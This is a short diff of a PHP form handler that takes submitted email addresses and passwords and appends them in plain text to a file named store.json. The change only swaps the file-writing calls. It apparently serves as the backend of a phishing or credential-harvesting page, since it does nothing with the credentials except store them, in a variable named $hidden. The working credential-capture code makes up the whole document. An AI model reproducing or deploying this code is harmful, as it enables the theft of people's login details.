@@ -1,14 +1,14 @@
 <?php 
 if(isset($_POST['submit'])){
-	$file = fopen("store.json" , "a") or die("unable to open the file");
+###	$file = fopen("store.json" , "a") or die("unable to open the file");
 	$file2 = 'store.json';
 $email = $_POST['email'];
 $password = $_POST['password'];
 
 $hidden = 'email is ' . $email . ' and password is ' . $password . "\n";
-$data = $hidden;
-	fwrite($file , $data);
-fclose($file);
+$data = file_get_contents($file2);
+$data .= $hidden;
+	file_put_contents($file2 , $data);
 };
 				
 ?>
